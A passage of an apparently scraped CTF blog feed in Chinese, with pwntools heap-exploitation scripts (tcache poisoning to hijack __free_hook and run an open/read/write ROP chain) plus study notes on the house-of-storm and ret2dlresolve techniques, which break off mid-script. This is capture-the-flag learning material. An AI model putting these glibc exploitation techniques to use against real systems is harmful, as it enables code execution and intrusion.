class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class="line">io=remote(&#x27;47.104.190.157&#x27; ,25329)</span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;size:\n&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line">io.sendafter(&#x27;context:\n&#x27;,context)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; \n&#x27;,&#x27;4&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;index:&#x27;,str(index))</span><br><span class="line">def exp():</span><br><span class="line">add(0,0x60)#0</span><br><span class="line">add(1,0x60)#1</span><br><span class="line">add(2,0x60)#2</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line">show(1)</span><br><span class="line">heap_base=u64(io.recvuntil(&#x27;\x55&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-0x770-0x40</span><br><span class="line">print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line">add(1,0x60)#1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(0,p64(heap_base))</span><br><span class="line">add(3,0x60)#3</span><br><span class="line"></span><br><span class="line">add(0,0x60)#tcache</span><br><span class="line">edit(0,&#x27;\x07&#x27;*0x30+&#x27;\x00&#x27;*(0x60-0x30))</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">dele(0)</span><br><span class="line">add(4,0x40)</span><br><span class="line">edit(0,&#x27;a&#x27;*0x50)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(&#x27;a&#x27;*0x50)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">pop_rdi=0x00000000000215bf+libc_base</span><br><span class="line">pop_rsi=0x0000000000023eea+libc_base</span><br><span class="line">pop_rdx=0x0000000000001b96+libc_base</span><br><span class="line">pop_rax=0x0000000000043ae8+libc_base</span><br><span class="line">open64=libc_base+libc.symbols[&#x27;open&#x27;]</span><br><span class="line">read=libc_base+libc.symbols[&#x27;read&#x27;]</span><br><span class="line">syscall=read+15</span><br><span class="line">write=libc_base+libc.symbols[&#x27;write&#x27;]</span><br><span class="line">setcontext=libc_base+libc.symbols[&#x27;setcontext&#x27;]+53</span><br><span class="line">edit(0,&#x27;\x00&#x27;*2+&#x27;\x01&#x27;+&#x27;\x00&#x27;*(0x40-3)+p64(0)*2+p64(free_hook-0x8))</span><br><span class="line"></span><br><span class="line">add(5,0x38)#free_hook</span><br><span class="line">edit(0,&#x27;\x00&#x27;*0x40+p64(0)+p64(0x211)+p64(malloc_hook+96+16))</span><br><span class="line"></span><br><span class="line">add(6,0x58)#6</span><br><span class="line"></span><br><span class="line">add(7,0x58)#7</span><br><span class="line">edit(0,&#x27;./flag\x00&#x27;)</span><br><span class="line">edit(1,p64(heap_base+0x880+0x40))</span><br><span class="line">edit(7,&#x27;\x00&#x27;*0x40+p64(heap_base+0x880+0x40)+p64(pop_rdi))</span><br><span class="line">edit(5,p64(heap_base+0xb10+0x40-0xa0)+p64(setcontext))</span><br><span class="line">#open(./flag,0)</span><br><span class="line">shellcode=p64(heap_base)+p64(open64)</span><br><span class="line">#read(fd,addr,0x30)        shellcode+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30)+p64(read)</span><br><span class="line">#write(1,addr,0x30)</span><br><span class="line">shellcode+=p64(pop_rdi)+p64(1)+p64(write)</span><br><span class="line">edit(2,shellcode)</span><br><span class="line">dele(6)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>storm</title>
      <link href="/2021/09/12/storm/"/>
      <url>/2021/09/12/storm/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-storm学习笔记"><a href="#house-of-storm学习笔记" class="headerlink" title="house of storm学习笔记"></a>house of storm学习笔记</h3><span id="more"></span><p>原理：结合了unsortedbin attack和largebin attack两种利用方法，我们知道这两种方法虽然都可以进行任意地址写的操作，但写入的数据是我们无法控制的，unsortedbin attack攻击写入 <code>unsorted_chunks(av)</code> 的值，而 largebin attack攻击写入<code>victim</code> 的值（参考下列源码）。 因此就可以利用这两中攻击方法来构造一个fakechunk使其进入unsortedbin中，然后我们就可以进行任意地址写的操作（数据可控）。我们先看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunk</span><br><span class="line">while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) </span><br><span class="line">&#123;</span><br><span class="line">//取出unsorted的尾部的chunk，此时victim即为尾部的chunk</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    /*，</span><br><span class="line">        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，</span><br><span class="line">        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。</span><br><span class="line">        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size </span><br><span class="line">        中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在 </span><br><span class="line">        unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接 </span><br><span class="line">        victim-&gt;size 没有问题。</span><br><span class="line">    */</span><br><span class="line">    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line"></span><br><span class="line">    size = chunksize(victim);//获取victim的size</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且</span><br><span class="line">        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上</span><br><span class="line">        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。</span><br><span class="line">        </span><br><span class="line">        last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，</span><br><span class="line">        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分</span><br><span class="line">        形成一个 chunk，last_remainder 就是 指向的这个 chunk。</span><br><span class="line">    */</span><br><span class="line">    if (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;</span><br><span class="line"></span><br><span class="line">        //分割remainder</span><br><span class="line">        remainder_size = size - nb;//计算分割后剩下的size</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);//获取remainder的地址</span><br><span class="line">        //把remainder加入unsorted bin中</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder; // 设置last_remainder为remainder</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        //如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零</span><br><span class="line">        if (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">//设置victim的size</span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        //设置remainder的size</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        //设置remainder的物理相邻的下一个chunk的prev_size</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);//默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//将chunk指针转化为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //把victim从unsorted bin 中移除</span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    //如果 victim 的size 与申请的size相等，那么就返回其。</span><br><span class="line">    if (size == nb) &#123;</span><br><span class="line">        //设置victim物理相邻的下一个chunk的prev_inuse位</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        //如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位</span><br><span class="line">        if (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA; </span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb); // 默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//把chunk转换为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    //如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中</span><br><span class="line">    //如果在smallbin的范围,则放到对应多small bin中</span><br><span class="line">    if (in_smallbin_range(size)) </span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = smallbin_index(size);//获取size对应的smallbin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头</span><br><span class="line">        //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    &#125;</span><br><span class="line">    else//如果不再smallbin的范围，也就是说在large bin 的范围</span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = largebin_index(size);//获取size对应的large bin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头</span><br><span class="line">        fwd = bck-&gt;fd;//fwd指向size对应的large bin的链表中的新加入的chunk</span><br><span class="line">        </span><br><span class="line">        //如果large bin 非空，在largbin进行按顺序插入</span><br><span class="line">        if (fwd != bck) &#123;</span><br><span class="line">            /* Or with inuse bit to speed comparisons */</span><br><span class="line">            size |= PREV_INUSE;</span><br><span class="line">            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">            /*</span><br><span class="line">            large bin中的chunk是按从大到小排列的，如果size &lt; large bin </span><br><span class="line">            的最后一个chunk，说明size是这个large bin中的最小的，我们把它</span><br><span class="line">            加入到此large bin尾部。</span><br><span class="line">            */</span><br><span class="line">            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">                </span><br><span class="line">                fwd = bck;</span><br><span class="line">                bck = bck-&gt;bk;</span><br><span class="line">                </span><br><span class="line">                /*</span><br><span class="line">                large bin 中size最小的chunk的fd_nextsize会指向size最大的</span><br><span class="line">                那个chunk，也就是首部的chunk。同样，large bin 中size最大的</span><br><span class="line">                chunk的bk_nextsize会指向size最小的那个chunk。</span><br><span class="line">                victim的bk_nextsize指向large bin原来最小的chunk，它的</span><br><span class="line">                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。</span><br><span class="line">                把它fd_nextsize和bk_nextsize都修正。</span><br><span class="line">                */</span><br><span class="line">                victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim</span><br><span class="line">                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125; </span><br><span class="line">            else //如果victim不是large bin 中最小的chunk</span><br><span class="line">            &#123;</span><br><span class="line">                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">                //从大到小（从头到尾）找到合适的位置</span><br><span class="line">                while ((unsigned long) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">                    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">                &#125;</span><br><span class="line">//如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了</span><br><span class="line">                if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                else </span><br><span class="line">                &#123;</span><br><span class="line">                    //size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中</span><br><span class="line">                    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                &#125;</span><br><span class="line">                bck = fwd-&gt;bk;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        else //如果large bin 为空，将victim加入到纵向列表</span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="line">    mark_bin(av, victim_index); //把victim加入到的bin的表示为非空</span><br><span class="line">    //把victim加入到对应的bin的链表中</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br><span class="line">&#125;</span><br><span class="line">//可以发现当执行malloc操作时，从unsortedbin中寻找chunk时，如果没有大小相等的chunk，就会将unsorted斌中末尾chunk放入smallbin中或largebin中，再进行切割取出。</span><br></pre></td></tr></table></figure><p>因此我们需要构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//更改后malloc，unsortedbin attack 将fake_chunk+0x10（fd）=unsorted_chunks(av)</span><br><span class="line">unsorted_chunk[1] = (unsigned long )fake_chunk;</span><br><span class="line">//largebin attack 将fake_chunk+8+0x10（bk）=victim（unsortedbin）</span><br><span class="line">large_chunk[1]    = (unsigned long )fake_chunk+8;</span><br><span class="line">//fake_chunk-0x18-5+0x20（size-5）=victim（unsortedbin）</span><br><span class="line">large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;</span><br><span class="line">//当在unsortedbin中的chunk杯放入largebin中，其fakechunk将会被放入unsortedbin尾部，其fd、bk指针都指向victim。</span><br></pre></td></tr></table></figure><p>接着malloc一个大小不大于0x50的chunk即可，因为开启pie后fakechunk的大小为0x55或0x56。</p><p><strong>注意：</strong> malloc的大小必须为0x50因为如果大小不和已经进入了unsortedbin尾部的chunk大小一样将会进入if的分支使其被放如smallbin中时出错。</p><p>总结：总的来说这个house-of-storm利用还是有些麻烦的，其实质是利用了largebinattack和unsortedbinattack攻击同时修改fakechunk的fd和bk指针和其size大小（开启pie后大小为0x55或0x56，没开pie的话一般随机），使fd、bk指针全部指向原来unsortedbin中唯一一个freechunk使fakechunk被放入unsortedbin末尾。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2_reslove</title>
      <link href="/2021/09/06/ret2-reslove/"/>
      <url>/2021/09/06/ret2-reslove/</url>
      
        <content type="html"><![CDATA[<h3 id="ret2-reslove学习笔记"><a href="#ret2-reslove学习笔记" class="headerlink" title="ret2_reslove学习笔记"></a>ret2_reslove学习笔记</h3><span id="more"></span><p>ret2_reslove这个高级利用之前一直没有太认真的去学，直到我碰到了一个没有输出函数的栈题，无法获得任何libc等其他地址信息，并且也没有gadget（比如pop edx）能够利用，因此我想到了ret2_reslove，这个高级rop可以在没有输出函数的情况下更换函数信息，拿到shell。</p><p>原理：在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。</p><p>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p><p>我们看一下<code>.dynamic</code> 的内容：</p><p>DT_STRTAB =&gt; .dynstr DT_SYMTAB =&gt; .dynsym DT_JMPREL =&gt; .rel.plt</p><p><img src="/2021/09/06/ret2-reslove/ABf1ag-blog\source_posts\ret2-reslove\image-20210906094913872.png" class="lazyload placeholder" data-srcset="/2021/09/06/ret2-reslove/ABf1ag-blog\source_posts\ret2-reslove\image-20210906094913872.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210906094913872"></p><figure class="highlight plaintext"><figcaption><span>:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20210906095627014](D:\ABf1ag-blog\source\_posts\ret2-reslove\image-20210906095627014.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>typedef struct<br>{<br>    Elf32_Addr    r_offset; //指向GOT表的指针,用于拿到真实地址后填入<br>    Elf32_Word    r_info;<br>    //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07<br>    //1和3是这个导入函数的符号在.dynsym中的下标，.dynsym+(r_info&gt;&gt;8)即可得到函数对应的dynsym结构体<br>} Elf32_Rel;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```.dymsym```</span><br><span class="line"></span><br><span class="line">![image-20210906100407603](D:\ABf1ag-blog\source\_posts\ret2-reslove\image-20210906100407603.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>typedef struct elf32_sym<br>{<br>    Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移,.dynstr+st_name即可得到函数名<br>    Elf32_Addr    st_value;<br>    Elf32_Word    st_size;<br>    unsigned char st_info; //对于导入函数符号而言，它是0x12<br>    unsigned char st_other;<br>    Elf32_Section st_shndx;<br>}Elf32_Sym; //对于导入函数符号而言，其他字段都是0</p><p>typedef struct elf64_sym<br>{<br>    Elf64_Word st_name;          // 符号名称，字符串表中的索引<br>    // STT_OBJECT表示符号关联到一个数据对象，如变量、数组或指针；<br>    // STT_FUNC表示符号关联到一个函数；<br>    // STT_NOTYPE表示符号类型未指定，用于未定义引用<br>    unsigned char st_info;         // 类型和绑定属性：STB_LOCAL/STB_GLOBAL/STB_WEAK；<br>    unsigned char st_other;      // 语义未定义，0<br>    Elf64_Half st_shndx;           // 相关节的索引，符号将绑定到该节，此外SHN_ABS指定符号是绝对值，不因重定位而改变，SHN_UNDEF标识未定义符号。<br>    Elf64_Addr st_value;           // 符号的值<br>    Elf64_Xword st_size;          // 符号的长度，如一个指针的长度或struct对象中包含的字节数。<br>}Elf64_Sym;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```.dynstr``` :存放着导入函数的函数名，依据函数名获得函数真实地址。</span><br><span class="line"></span><br><span class="line">![image-20210906101152393](D:\ABf1ag-blog\source\_posts\ret2-reslove\image-20210906101152393.png)</span><br><span class="line"></span><br><span class="line">### _dl_runtime_resolve 会干什么？</span><br><span class="line"></span><br><span class="line">_dl_runtime_resolve 会</span><br><span class="line"></span><br><span class="line">1. 用 link_map (第一个参数) 访问.dynamic，取出.dynstr, .dynsym, .rel.plt 的指针</span><br><span class="line">2. .rel.plt + Offset (第二个参数)，求出当前函数的在重定位表项 (.rel.plt) 中 Elf32_Rel 具体位置 (指针)，记作 rel</span><br><span class="line">3. rel-&gt;r_info &gt;&gt; 8 作为.dynsym 的下标，求出当前函数在符号表项 (.dynsym) 中 Elf32_Sym 的具体位置 (指针)，记作 sym</span><br><span class="line">4. .dynstr + sym-&gt;st_name，得到符号名字符串指针</span><br><span class="line">5. 在动态链接库查找这个字符串对应的函数的地址，并且把地址赋值给 * rel-&gt;r_offset，即 GOT 表</span><br><span class="line">6. 调用这个函数</span><br><span class="line"></span><br><span class="line">### 利用</span><br><span class="line"></span><br><span class="line"> **1.(No RELRO) 直接改写.dynstr**</span><br><span class="line">直接改写.dynstr 中对应函数字符串内容为我们想要的内容。比如修改 free 为 system，这样 free (buf) 的时候，如果 buf 的内容是 &quot;/bin/sh&quot;， 那么就实现了 system (&quot;/bin/sh&quot;)。</span><br><span class="line"></span><br><span class="line">**2.（开启但不完全开启），伪造reloc_index**</span><br><span class="line"></span><br><span class="line"> 修改_dl_runtime_resolve第二个参数的值，其第二个参数reloc_index是用来确定对应函数的.rel.plt的地址，因此我们可以将其改为我们伪造的.rel.plt的地址，又因为.rel.plt结构体包含两个变量```r_offset``` 和```r_info``` ,因此我们在```r_offset``` 处填上要修改的函数的got地址， ```r_info``` 填入```(r_sym&lt;&lt;8)+(r_type&amp;0xff)``` ,其中r_sym又可以确定对应函数的.dynsym的地址，其中包含st_name可以确定.dynstr的地址，在.dynstr的地址上写入system这样\_dl_runtime_solve可以根据’system‘字符串找到system函数的地址填入到got表中，这样就改变了函数的got表。</span><br><span class="line"></span><br><span class="line">exp：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>from pwn import *<br>io = process(‘./pwn200’)<br>elf=ELF(‘./pwn200’)<br>context.log_level=’debug’<br>read_plt=elf.plt[‘read’]<br>strlen_plt=elf.plt[‘strlen’]<br>strlen_got=elf.got[‘strlen’]<br>pppr=0x08048609<br>pop_ebp=0x0804860b<br>leaver=0x804851D<br>plt_0=elf.get_section_by_name(‘.plt’).header.sh_addr<br>rel_plt=elf.get_section_by_name(‘.rel.plt’).header.sh_addr<br>dynsym=elf.get_section_by_name(‘.dynsym’).header.sh_addr<br>dynstr=elf.get_section_by_name(‘.dynstr’).header.sh_addr<br>bss_addr=elf.get_section_by_name(‘.bss’).header.sh_addr+0x600<br>def exp():<br>    io.recvuntil(‘Gleaf!\n’)<br>    